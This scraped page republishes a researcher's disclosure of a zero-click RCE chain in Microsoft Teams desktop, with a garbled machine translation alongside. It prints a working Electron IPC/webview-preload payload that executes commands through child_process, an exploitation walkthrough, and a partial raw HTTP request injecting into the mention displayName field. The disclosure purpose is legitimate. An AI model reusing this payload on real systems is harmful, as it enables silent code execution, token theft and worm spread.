<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>é‡è¦ï¼Œæ¬ºéª—ï¼ˆMSå›¢é˜Ÿä¸­çš„é›¶äº¤äº’RCEï¼‰ Important, Spoofing (zero-interaction RCE in MS Teams)</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Important, Spoofing (zero-interaction RCE in MS Teams)<br/>é‡è¦ï¼Œæ¬ºéª—ï¼ˆMSå›¢é˜Ÿä¸­çš„é›¶äº¤äº’RCEï¼‰ </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-12-07 21:54:30</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2020/12/28c6057ad76715e10a4a54b4b7629622.png"><img src="http://img2.diglog.com/img/2020/12/28c6057ad76715e10a4a54b4b7629622.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>Microsoft accepted this chain of bugs as &#34;Important&#34; (severity), &#34;Spoofing&#34; (impact) in  O365 cloud bug bounty program.  That is one of the lowest in-scope ratings possible.</p><p>Microsoftå°†æ­¤é”™è¯¯é“¾è§†ä¸ºâ€œé‡è¦â€ã€‚ ï¼ˆä¸¥é‡ç¨‹åº¦ï¼‰ï¼Œï¼†ï¼ƒ34;æ¬ºéª—ï¼†ï¼ƒ34; ï¼ˆå½±å“ï¼‰åœ¨O365äº‘æ¼æ´èµé‡‘è®¡åˆ’ä¸­ã€‚è¿™æ˜¯å¯èƒ½çš„æœ€ä½èŒƒå›´å†…è¯„çº§ä¹‹ä¸€ã€‚</p><p> At least now we have a new joke between colleagues - whenever we get a remote code execution (RCE) bug, we call it &#34;Important, Spoofing&#34;. Thanks Microsoft!  ğŸ˜‚</p><p> è‡³å°‘ç°åœ¨æˆ‘ä»¬åœ¨åŒäº‹ä¹‹é—´å¼€äº†ä¸ªæ–°ç©ç¬‘-æ¯å½“æˆ‘ä»¬é‡åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰é”™è¯¯æ—¶ï¼Œæˆ‘ä»¬éƒ½å°†å…¶ç§°ä¸ºâ€œé‡è¦ï¼Œæ¬ºéª—â€ã€‚è°¢è°¢å¾®è½¯ï¼ ğŸ˜‚</p><p> To be entirely fair, they did have a separate rating for the desktop app as &#34;Critical, Remote Code Execution&#34;, but only for &#34;Microsoft points&#34;! Microsoft points get you on  MSRC leaderboards.</p><p> å…¬å¹³åœ°è¯´ï¼Œä»–ä»¬ç¡®å®å°†å°å¼æœºåº”ç”¨ç¨‹åºè¯„ä¸ºâ€œå…³é”®ï¼Œè¿œç¨‹æ‰§è¡Œä»£ç â€ï¼Œä½†ä»…é’ˆå¯¹â€œå¾®è½¯ç§¯åˆ†â€ï¼å¾®è½¯çš„ç§¯åˆ†ä½¿æ‚¨è¿›å…¥MSRCæ’è¡Œæ¦œã€‚</p><p> Enjoy reading this writeup! This is the first from five zero or one-click Microsoft Teams remote code execution (&#34;Important, Spoofing&#34;) bug chains sent in to MSRC.</p><p> å–œæ¬¢é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼è¿™æ˜¯å‘é€ç»™MSRCçš„äº”ä¸ªé›¶æˆ–ä¸€é”®å•å‡»Microsoft Teamsè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆâ€œé‡è¦ï¼Œæ¬ºéª—â€ï¼‰é”™è¯¯é“¾ä¸­çš„ç¬¬ä¸€ä¸ªã€‚</p><p>     â€¼ï¸ Â   That&#39;s it. There is no further interaction from vicim. Now your company&#39;s internal network, personal documents, O365 documents/mail/notes, secret chats are fully compromised. Think about it. One message, one channel, no interaction. Everyone gets exploited.</p><p>     ï¼ï¸å°±æ˜¯è¿™æ ·ã€‚ vicimæ²¡æœ‰è¿›ä¸€æ­¥çš„äº’åŠ¨ã€‚ç°åœ¨ï¼Œæ‚¨å…¬å¸çš„å†…éƒ¨ç½‘ç»œï¼Œä¸ªäººæ–‡æ¡£ï¼ŒO365æ–‡æ¡£/é‚®ä»¶/ä¾¿ç¬ºï¼Œç§˜å¯†èŠå¤©å·²è¢«å®Œå…¨ç ´åã€‚æƒ³ä¸€æƒ³ã€‚ä¸€æ¡æ¶ˆæ¯ï¼Œä¸€æ¡æ¸ é“ï¼Œæ²¡æœ‰äº’åŠ¨ã€‚æ¯ä¸ªäººéƒ½è¢«å‰¥å‰Šã€‚</p><p> So let&#39;s expand on that. What if the recipients then automatically post it in their teams, channels? Everybody gets exploited. Did you know you can be a guest in other organisations? Probably your organisation already has several guests. They most likely are in their own organisations and those orgs probably have guests, which are in their own organisations, which are ...  ğŸ™‚ Â  Yes, it could be made into a worm, which spreads within the Microsoft Teams network, at least within an organisation.</p><p> å› æ­¤ï¼Œè®©æˆ‘ä»¬å¯¹æ­¤è¿›è¡Œæ‰©å±•ã€‚å¦‚æœæ”¶ä»¶äººéšåå°†å…¶è‡ªåŠ¨å‘å¸ƒåˆ°å…¶å›¢é˜Ÿï¼Œæ¸ é“ä¸­æ€ä¹ˆåŠï¼Ÿæ¯ä¸ªäººéƒ½è¢«å‰¥å‰Šã€‚æ‚¨çŸ¥é“æ‚¨å¯ä»¥æˆä¸ºå…¶ä»–ç»„ç»‡çš„å®¢äººå—ï¼Ÿæ‚¨çš„ç»„ç»‡å¯èƒ½å·²ç»æœ‰å‡ ä¸ªæ¥å®¾ã€‚ä»–ä»¬å¾ˆå¯èƒ½åœ¨è‡ªå·±çš„ç»„ç»‡ä¸­ï¼Œè€Œé‚£äº›ç»„ç»‡å¯èƒ½åœ¨ä»–ä»¬è‡ªå·±çš„ç»„ç»‡ä¸­æœ‰å®¢äººï¼Œè¿™äº›äººæ˜¯â€¦â€¦...æ˜¯çš„ï¼Œå®ƒå¯èƒ½ä¼šå˜æˆè •è™«ï¼Œå¹¶åœ¨Microsoft Teamsç½‘ç»œä¸­ä¼ æ’­ï¼Œè‡³å°‘åœ¨ä¸€ä¸ªå†…éƒ¨ã€‚ç»„ç»‡ã€‚</p><p> The demo is almost boring - all you need is a non-interactive single HTTP request.</p><p> è¯¥æ¼”ç¤ºå‡ ä¹æ— èŠ-æ‚¨åªéœ€è¦ä¸€ä¸ªéäº¤äº’å¼çš„å•ä¸ªHTTPè¯·æ±‚å³å¯ã€‚ </p><p>  After receiving the &#34;Important, Spoofing&#34; rating, I sent a list of bulletpoints - what I considered the real impact as argumentation to MSRC employees. I was hoping maybe they reconsider. The discussion was mostly without substance - just reiterating the ratings. It took weeks for each response, every time me having to remind them about it.</p><p>æ”¶åˆ°â€œé‡è¦çš„æ¬ºéª—â€é‚®ä»¶åï¼Œè¯„çº§åï¼Œæˆ‘å‘é€äº†ä¸€ç³»åˆ—è¦ç‚¹-æˆ‘è®¤ä¸ºå¯¹MSRCå‘˜å·¥çš„è®ºç‚¹æ˜¯çœŸæ­£çš„å½±å“ã€‚æˆ‘å¸Œæœ›ä»–ä»¬èƒ½é‡æ–°è€ƒè™‘ã€‚è®¨è®ºåŸºæœ¬ä¸Šæ²¡æœ‰å®è´¨æ€§å†…å®¹ï¼Œåªæ˜¯é‡ç”³äº†è¯„çº§ã€‚æ¯æ¬¡å›å¤éƒ½èŠ±äº†æ•°å‘¨æ—¶é—´ï¼Œæ¯æ¬¡æˆ‘éƒ½è¦æé†’ä»–ä»¬ã€‚</p><p> Sooo, after around 3 months it ended as-is: &#34;Important, Spoofing&#34; and that the desktop client - remote code execution - is &#34;out of scope&#34;.</p><p> å¦‚æ­¤ï¼Œå¤§çº¦3ä¸ªæœˆåï¼Œå®ƒæŒ‰åŸæ ·ç»“æŸï¼šï¼†ï¼ƒ34;é‡è¦çš„æ¬ºéª—ï¼†ï¼ƒ34;å¹¶ä¸”æ¡Œé¢å®¢æˆ·ç«¯-è¿œç¨‹ä»£ç æ‰§è¡Œ-è¶…å‡ºäº†èŒƒå›´ï¼†ï¼ƒ34;ã€‚</p><p> I mean, Microsoft can take the desktop app out of scope, which in my opinion is absurd as it&#39;s promoted as the primary way to use Microsoft Teams.. but how is any of this &#34;Important&#34; and what the hell is &#34;Spoofing&#34;?  ğŸ˜€</p><p> æˆ‘çš„æ„æ€æ˜¯ï¼ŒMicrosoftå¯ä»¥å°†æ¡Œé¢åº”ç”¨ç¨‹åºæ’é™¤åœ¨èŒƒå›´ä¹‹å¤–ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯è’è°¬çš„ï¼Œå› ä¸ºå®ƒè¢«æ¨å¹¿ä¸ºä½¿ç”¨Microsoft Teamsçš„ä¸»è¦æ–¹å¼ã€‚.ä½†æ˜¯ï¼Œä»»ä½•é‡è¦çš„äº‹æƒ…å¦‚ä½•å‘¢ï¼Ÿåˆ°åº•æ˜¯ä»€ä¹ˆæ¬ºéª—ï¼Ÿ ğŸ˜€</p><p>  Stored XSS with no interaction required. Impacts all messaging thread types - private, threads, groups etc.</p><p>  æ— éœ€äº¤äº’å³å¯å­˜å‚¨çš„XSSã€‚å½±å“æ‰€æœ‰æ¶ˆæ¯ä¼ é€’çº¿ç¨‹ç±»å‹-ä¸“ç”¨ï¼Œçº¿ç¨‹ï¼Œç»„ç­‰ã€‚</p><p> Self-replicating worm - victim reposts payload to all contacts, groups. Everyone reposts to contacts, groups (guests have access to orgs too, which have access to their own orgs etc.)</p><p> è‡ªå¤åˆ¶è •è™«-å—å®³è€…å°†æœ‰æ•ˆè½½è·é‡æ–°å‘å¸ƒåˆ°æ‰€æœ‰è”ç³»äººï¼Œç»„ã€‚æ¯ä¸ªäººéƒ½é‡æ–°å‘å¸ƒåˆ°è”ç³»äººï¼Œç»„ï¼ˆè®¿å®¢ä¹Ÿå¯ä»¥è®¿é—®ç»„ç»‡ï¼Œè€Œç»„ç»‡ä¹Ÿå¯ä»¥è®¿é—®è‡ªå·±çš„ç»„ç»‡ç­‰ï¼‰</p><p> SSO token stealing for all org users - you have access to all SSO O365 tokens from XSS in i.e. account takeover - which means access to company mail, documents, notes, everything in O365</p><p> æ‰€æœ‰ç»„ç»‡ç”¨æˆ·çš„SSOä»¤ç‰Œçªƒå–-æ‚¨å¯ä»¥é€šè¿‡XSSåœ¨å¸æˆ·æ¥ç®¡ä¸­è®¿é—®æ‰€æœ‰SSO O365ä»¤ç‰Œ-è¿™æ„å‘³ç€å¯ä»¥è®¿é—®å…¬å¸é‚®ä»¶ï¼Œæ–‡æ¡£ï¼Œè¯´æ˜ä»¥åŠO365ä¸­çš„æ‰€æœ‰å†…å®¹</p><p> Access to private conversations, messages, files, call logs and everything else you have in MS Teams</p><p> è®¿é—®ç§äººå¯¹è¯ï¼Œæ¶ˆæ¯ï¼Œæ–‡ä»¶ï¼Œé€šè¯è®°å½•ä»¥åŠæ‚¨åœ¨MS Teamsä¸­æ‹¥æœ‰çš„æ‰€æœ‰å…¶ä»–å†…å®¹ </p><p>   Arbitrary command execution on victim devices with no interaction from victim, cross platform (macOS, Windows, Linux)</p><p>åœ¨å—å®³è®¾å¤‡ä¸Šä»»æ„æ‰§è¡Œå‘½ä»¤ï¼Œä¸å—å—å®³è€…ï¼Œè·¨å¹³å°ï¼ˆmacOSï¼ŒWindowsï¼ŒLinuxï¼‰çš„äº¤äº’</p><p> Complete loss of confidentiality &amp; integrity for end users - access to private chats, files, internal network, private keys and personal data outside MS Teams</p><p> å®Œå…¨ä¸§å¤±æœºå¯†æ€§æœ€ç»ˆç”¨æˆ·çš„å®Œæ•´æ€§-åœ¨MS Teamsä¹‹å¤–è®¿é—®ç§äººèŠå¤©ï¼Œæ–‡ä»¶ï¼Œå†…éƒ¨ç½‘ç»œï¼Œç§äººå¯†é’¥å’Œä¸ªäººæ•°æ®</p><p> Ever wonder how MS Teams can &#39;seamlessly&#39; access everything in your O365? Attackers don&#39;t, they could in the same way Teams does.</p><p> æ›¾ç»æƒ³è¿‡MSå›¢é˜Ÿå¦‚ä½•æ— ç¼åœ°ï¼†ï¼ƒ39;è®¿é—®æ‚¨çš„O365ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Ÿæ”»å‡»è€…ä¸ä¼šï¼Œè€ŒTeamsä¹Ÿå¯ä»¥è¿™æ ·åšã€‚</p><p>  An additional, universal Electron  redacted RCE payload, which was included in the report&#39;s video/media attachments</p><p>  æŠ¥å‘Šçš„è§†é¢‘/åª’ä½“é™„ä»¶ä¸­åŒ…å«äº†å¦ä¸€ä¸ªé€šç”¨çš„ç”µå­ç¼–è¾‘çš„RCEæœ‰æ•ˆè´Ÿè½½</p><p> Both RCE payloads allow to bypass Microsoft Teams specific Electron app security, but probably could be universally adapted to older ElectronJS versions with similar security constraints.</p><p> ä¸¤ç§RCEæœ‰æ•ˆè´Ÿè½½å‡å…è®¸ç»•è¿‡Microsoftå›¢é˜Ÿç‰¹å®šçš„Electronåº”ç”¨ç¨‹åºå®‰å…¨æ€§ï¼Œä½†å¯èƒ½å¯ä»¥æ™®éé€‚ç”¨äºå…·æœ‰ç±»ä¼¼å®‰å…¨æ€§çº¦æŸçš„æ—§ç‰ˆElectronJSã€‚</p><p> MS Teams ElectronJS security:  remote-require is disabled &amp; filtered,  nodeIntegration is  false,  webview creation is filtered and normally removes insecure params/options. You cannot simply import  child_process and execute arbitrary code or create a  webview with a custom  preload option.</p><p> MS Teams ElectronJSå®‰å…¨æ€§ï¼šè¿œç¨‹è¦æ±‚å·²ç¦ç”¨ï¼†amp;å·²è¿‡æ»¤ï¼ŒnodeIntegrationä¸ºfalseï¼Œå·²è¿‡æ»¤Webè§†å›¾åˆ›å»ºï¼Œå¹¶ä¸”é€šå¸¸ä¼šåˆ é™¤ä¸å®‰å…¨çš„å‚æ•°/é€‰é¡¹ã€‚æ‚¨ä¸èƒ½ç®€å•åœ°å¯¼å…¥child_processå¹¶æ‰§è¡Œä»»æ„ä»£ç æˆ–ä½¿ç”¨è‡ªå®šä¹‰é¢„åŠ è½½é€‰é¡¹åˆ›å»ºWebè§†å›¾ã€‚</p><p>    Ok, the injected template string is visible for a split second, but normally you wouldn&#39;t see it - as can be evidenced in the next demo and all the rest of AngularJS template strings in Teams you don&#39;t see. I attribute the glitch to the HTTP proxy, general slowness of the app, live-reloading and the fact that it&#39;s a demo so it must fail in some way  ğŸ™‚</p><p>    å¥½çš„ï¼Œæ³¨å…¥çš„æ¨¡æ¿å­—ç¬¦ä¸²åœ¨ä¸€ç§’é’Ÿå†…æ˜¯å¯è§çš„ï¼Œä½†æ˜¯é€šå¸¸æ‚¨ä¸ä¼šçœ‹åˆ°å®ƒ-åœ¨ä¸‹ä¸€ä¸ªæ¼”ç¤ºä¸­ä»¥åŠæ‚¨çœ‹ä¸åˆ°çš„Teamsä¸­æ‰€æœ‰å…¶ä»–AngularJSæ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¯ä»¥è¯æ˜ã€‚æˆ‘å°†æ•…éšœå½’å› äºHTTPä»£ç†ï¼Œåº”ç”¨ç¨‹åºæ™®éè¿è¡Œç¼“æ…¢ï¼Œå®æ—¶é‡æ–°åŠ è½½ä»¥åŠå®ƒæ˜¯ä¸€ä¸ªæ¼”ç¤ºç¨‹åºï¼Œå› æ­¤å®ƒä¸€å®šä¼šå¤±è´¥çš„äº‹å®ğŸ™‚ </p><p>    The blank window could have arbitrary content, size, look - it&#39;s &#34;suspiciously blank&#34; because it&#39;s a PoC.</p><p>ç©ºç™½çª—å£å¯ä»¥å…·æœ‰ä»»æ„å†…å®¹ï¼Œå¤§å°å’Œå¤–è§‚-å¯ç–‘åœ°ä¸ºç©ºç™½å› ä¸ºå®ƒæ˜¯PoCã€‚</p><p>  No user interaction is required, exploit executes upon seeing the chat message. This exploit bypasses webview restrictions and abuses MS Teams API calls to &#34;download&#34; a file and use it as  preload (nodeJS context) for a  webview. Teams actually filters  webview creation - filtering  preload and other dangerous options, but in this way the check could be bypassed. Probably the idea could be used in other, older ElectronJS apps.</p><p>  æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ¼æ´åˆ©ç”¨ç¨‹åºä¼šåœ¨çœ‹åˆ°èŠå¤©æ¶ˆæ¯åæ‰§è¡Œã€‚æ­¤æ¼æ´åˆ©ç”¨ç»•è¿‡äº†Webviewé™åˆ¶ï¼Œå¹¶æ»¥ç”¨äº†MS Teams APIè°ƒç”¨ï¼†ï¼ƒ34; downloadï¼†ï¼ƒ34;ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç”¨ä½œWebviewçš„é¢„åŠ è½½ï¼ˆnodeJSä¸Šä¸‹æ–‡ï¼‰ã€‚å›¢é˜Ÿå®é™…ä¸Šè¿‡æ»¤äº†Webviewçš„åˆ›å»º-è¿‡æ»¤äº†é¢„åŠ è½½å’Œå…¶ä»–å±é™©çš„é€‰é¡¹ï¼Œä½†æ˜¯è¿™æ ·å¯ä»¥ç»•è¿‡æ£€æŸ¥ã€‚è¿™ä¸ªæƒ³æ³•å¯èƒ½å¯ä»¥åœ¨å…¶ä»–è¾ƒæ—§çš„ElectronJSåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚</p><p> cmd  =  `open /System/Applications/Calculator.app`  // change to windows/linux command as required stage1  =  `data:text/plain,cp=require(&#39;child_process&#39;);cp.exec(&#39;  ${ cmd }&#39;)` ;  // create a virtual file to download this . electronSafeIpc . send ( `desktopFileDownload` ,  stage1 ) ;  // request to download file // implement an event handler when files downloaded to trigger payload this . electronSafeIpc . on ( `desktop-file-download-finished` ,  ( _ ,  fileinfo )  =&gt;  {  f  =  fileinfo . uniqueFile . filePath ;  // event gives us file path which we don&#39;t know beforehand  // create a new webview mockup - window with a webview tag and our virtual, downloaded file as preload  stage2  =  `data:text/html,&lt;webview src=&#39;about:blank&#39; preload=&#39;file:///  ${ f }&#39;&gt;&lt;/webview&gt;`  this . electronSafeIpc . send ( `allowWindowOpenUrl` ,  stage2 ) ;  // abusing MS Teams IPC API to allow above URL  this . w  =  window . open ( stage2 ) ;  // URL gets opened, webview gets created with our virtual, downloaded file preload  setTimeout ( ( ) =&gt; { this . w . close ( ) } , 1000 )  // not necessary, but let&#39;s close the custom window  } )</p><p> cmd =`open / System / Applications / Calculator.app` //æ ¹æ®éœ€è¦æ›´æ”¹ä¸ºWindows / linuxå‘½ä»¤stage1 =`dataï¼štext / plainï¼Œcp = requireï¼ˆï¼†ï¼ƒ39; child_processï¼†ï¼ƒ39;ï¼‰; cp.execï¼ˆ ï¼†ï¼ƒ39; $ {cmd}ï¼†ï¼ƒ39;ï¼‰`; //åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ä»¥ä¸‹è½½æ­¤æ–‡ä»¶ã€‚ electronicSafeIpcã€‚å‘é€ï¼ˆ`desktopFileDownload`ï¼Œstage1ï¼‰; //è¯·æ±‚ä¸‹è½½æ–‡ä»¶//åœ¨ä¸‹è½½æ–‡ä»¶ä»¥è§¦å‘æœ‰æ•ˆè½½è·thisæ—¶å®ç°äº‹ä»¶å¤„ç†ç¨‹åºã€‚ electronicSafeIpcã€‚ onï¼ˆ`desktop-file-download-finished`ï¼Œï¼ˆ_ï¼Œfileinfoï¼‰=ï¼†gt; {f = fileinfoã€‚uniqueFileã€‚filePath; //äº‹ä»¶ä¸ºæˆ‘ä»¬æä¾›äº†æˆ‘ä»¬äº‹å…ˆä¸çŸ¥é“çš„æ–‡ä»¶è·¯å¾„//åˆ›å»ºä¸€ä¸ªæ–°webviewæ ·æœº-å…·æœ‰webviewæ ‡è®°å’Œæˆ‘ä»¬è™šæ‹Ÿä¸‹è½½çš„æ–‡ä»¶çš„çª—å£ï¼Œä½œä¸ºé¢„åŠ è½½stage2 =`dataï¼štext / htmlï¼Œï¼†lt; webview src =ï¼†ï¼ƒ39; aboutï¼šblankï¼†ï¼ƒ39; preload =ï¼†ï¼ƒ39; fileï¼š// / $ {f}ï¼†ï¼ƒ39;ï¼†lt; / webviewï¼†gt;`this.electronSafeIpcã€‚sendï¼ˆ`allowWindowOpenUrl`ï¼Œstage2ï¼‰; //æ»¥ç”¨MS Teams IPC APIå…è®¸ä¸Šé¢çš„URLæ­¤w.window.openï¼ˆstage2 ï¼‰; //æ‰“å¼€URLï¼Œå¹¶ä½¿ç”¨æˆ‘ä»¬å·²ä¸‹è½½çš„è™šæ‹Ÿä¸‹è½½æ–‡ä»¶é¢„åŠ è½½setTimeoutï¼ˆï¼ˆï¼‰=ï¼†gt; {thisã€‚wã€‚closeï¼ˆï¼‰}ï¼Œ1000ï¼‰//åˆ›å»º// WebViewï¼Œ//ä¸éœ€è¦ï¼Œä½†è®©æˆ‘ä»¬å…³é—­è‡ªå®šä¹‰çª—å£}ï¼‰</p><p>   A Remote Code Execution vulnerability has been identified in MS Teams desktop which can be triggered by a novel XSS (Cross-Site Scripting) injection in teams.microsoft.com. A specifically crafted chat message can be sent to any Microsoft Teams member or channel which will execute arbitrary code on victim PC&#39;s with NO USER INTERACTION.</p><p>   MS Teamsæ¡Œé¢ä¸­å·²å‘ç°ä¸€ä¸ªâ€œè¿œç¨‹æ‰§è¡Œä»£ç â€æ¼æ´ï¼Œè¯¥æ¼æ´å¯èƒ½ç”±team.microsoft.comä¸­çš„æ–°å‹XSSï¼ˆè·¨ç«™ç‚¹è„šæœ¬ï¼‰æ³¨å…¥è§¦å‘ã€‚å¯ä»¥å°†ç‰¹åˆ¶çš„èŠå¤©æ¶ˆæ¯å‘é€åˆ°ä»»ä½•Microsoft Teamsæˆå‘˜æˆ–æ¸ é“ï¼Œè¿™äº›æˆå‘˜æˆ–æ¸ é“å°†åœ¨æ— éœ€ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹åœ¨å—å®³PCä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p> Remote Code Execution has been achieved in desktop applications across all supported platforms (Windows, macOS, Linux). Code execution gives attackers full access to victim devices and company internal networks via those devices.</p><p> å·²åœ¨æ‰€æœ‰å—æ”¯æŒå¹³å°ï¼ˆWindowsï¼ŒmacOSï¼ŒLinuxï¼‰çš„æ¡Œé¢åº”ç”¨ç¨‹åºä¸­å®ç°äº†è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä»£ç æ‰§è¡Œä½¿æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™äº›è®¾å¤‡å®Œå…¨è®¿é—®å—å®³è®¾å¤‡å’Œå…¬å¸å†…éƒ¨ç½‘ç»œã€‚</p><p> Even without arbitrary code execution on victim device, with the demonstrated XSS it&#39;s possible for an attacker to obtain SSO authorisation tokens for Microsoft Teams and other Microsoft Services (e.g. Skype, Outlook, Office365). Furthermore, the XSS vulnerability by itself allows to access confidential / private conversations, files etc. from within MS Teams.</p><p> å³ä½¿æ²¡æœ‰åœ¨å—å®³è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä½¿ç”¨æ¼”ç¤ºçš„XSSï¼Œæ”»å‡»è€…ä¹Ÿæœ‰å¯èƒ½è·å¾—Microsoft Teamså’Œå…¶ä»–Microsoft Servicesï¼ˆä¾‹å¦‚Skypeï¼ŒOutlookï¼ŒOffice365ï¼‰çš„SSOæˆæƒä»¤ç‰Œã€‚æ­¤å¤–ï¼ŒXSSæ¼æ´æœ¬èº«å…è®¸ä»MS Teamså†…éƒ¨è®¿é—®æœºå¯†/ç§äººå¯¹è¯ï¼Œæ–‡ä»¶ç­‰ã€‚</p><p> These attacks could be performed by guest users completely silently with no user interaction or indications of compromise.</p><p> æ¥å®¾ç”¨æˆ·å¯ä»¥å®Œå…¨æ— æç¤ºåœ°æ‰§è¡Œè¿™äº›æ”»å‡»ï¼Œè€Œæ— éœ€ç”¨æˆ·å¹²é¢„æˆ–æŸå®³çš„è¿¹è±¡ã€‚ </p><p>    &#39;wormable&#39; - possible to automatically repost the exploit payload to other companies, channels, users with no interaction</p><p>ï¼†ï¼ƒ39;è •è™«ï¼†ï¼ƒ39; -å¯ä»¥è‡ªåŠ¨å°†æ¼æ´æœ‰æ•ˆè½½è·é‡æ–°å‘å¸ƒåˆ°å…¶ä»–å…¬å¸ï¼Œæ¸ é“ï¼Œç”¨æˆ·ï¼Œè€Œæ— éœ€äº¤äº’</p><p>  complete loss of confidentiality &amp; integrity for end users - access to private chats, files, internal network, private keys and personal data outside MS Teams</p><p>  å®Œå…¨ä¸§å¤±æœºå¯†æ€§æœ€ç»ˆç”¨æˆ·çš„å®Œæ•´æ€§-åœ¨MS Teamsä¹‹å¤–è®¿é—®ç§äººèŠå¤©ï¼Œæ–‡ä»¶ï¼Œå†…éƒ¨ç½‘ç»œï¼Œç§äººå¯†é’¥å’Œä¸ªäººæ•°æ®</p><p> access to SSO tokens and therefore other Microsoft services in addition to MS Teams (Outlook, Office365 etc.)</p><p> è®¿é—®SSOä»¤ç‰Œï¼Œä»è€Œè®¿é—®é™¤MS Teamsï¼ˆOutlookï¼ŒOffice365ç­‰ï¼‰ä¹‹å¤–çš„å…¶ä»–MicrosoftæœåŠ¡</p><p>  This report contains a new XSS vector and a novel RCE payload which are used together. It affects the chatting system within Microsoft Teams and can be used in e.g. direct messages, channels.</p><p>  è¯¥æŠ¥å‘ŠåŒ…å«ä¸€èµ·ä½¿ç”¨çš„æ–°çš„XSSå‘é‡å’Œæ–°é¢–çš„RCEæœ‰æ•ˆè´Ÿè½½ã€‚å®ƒä¼šå½±å“Microsoft Teamsä¸­çš„èŠå¤©ç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¾‹å¦‚ç›´æ¥æ¶ˆæ¯ï¼Œæ¸ é“ã€‚</p><p>     Type a chat message in either direct communication or channel, mention a user or a custom tag within this chat</p><p>     åœ¨ç›´æ¥é€šè®¯æˆ–é¢‘é“ä¸­è¾“å…¥èŠå¤©æ¶ˆæ¯ï¼Œå¹¶åœ¨æ­¤èŠå¤©ä¸­æåŠç”¨æˆ·æˆ–è‡ªå®šä¹‰æ ‡ç­¾</p><p> Edit the chat message containing the mention and intercept with a HTTP proxy like Burp Suite</p><p> ç¼–è¾‘åŒ…å«æåŠå†…å®¹çš„èŠå¤©æ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨HTTPä»£ç†ï¼ˆä¾‹å¦‚Burp Suiteï¼‰è¿›è¡Œæ‹¦æˆª</p><p> In mention functionality, the vulnerable parameter is  displayName within the  { content: &#34;...&#34;, properties: { &#34;mentions&#34; : &#34;[{ displayName: PAYLOAD HERE }]&#34; JSON message structure.</p><p> åœ¨æåŠåŠŸèƒ½æ–¹é¢ï¼Œæ˜“å—æ”»å‡»çš„å‚æ•°æ˜¯{contentï¼šï¼†ï¼ƒ34; ...ï¼†ï¼ƒ34;å±æ€§ï¼š{ï¼†ï¼ƒ34; mentionsï¼†ï¼ƒ34; ï¼šï¼†ï¼ƒ34; [{displayNameï¼šPAYLOAD HERE}]ï¼†ï¼ƒ34 ;ï¼š JSONæ¶ˆæ¯ç»“æ„ã€‚ </p><p>  PUT  /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1  Host: emea.ng.msg.teams.microsoft.com  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0  Accept: json  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/json  Authentication: skypetoken=...snip...  ClientInfo: os=macos; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2020080725; utcOffset=+03:00  BehaviorOverride: redirectAs404  Content-Length: 1174{  &#34;content &#34;:  &#34;&lt;div&gt;&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt; \n&lt;div&gt;&lt;span itemscope itemtype= \&#34;http://schema.skype.com/Mention \&#34; itemid= \&#34;0 \&#34;&gt;dada&lt;/span&gt;&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; \n&lt;/div&gt; &#34;,  &#34;messagetype &#34;:  &#34;RichText/Html &#34;,  &#34;contenttype &#34;:  &#34;text &#34;,  &#34;amsreferences &#34;:[],  &#34;clientmessageid &#34;:  &#34;9868848366534370000 &#34;,  &#34;imdisplayname &#34;:  &#34;Oskars Vegeris &#34;,  &#34;properties &#34;:{  &#34;importance 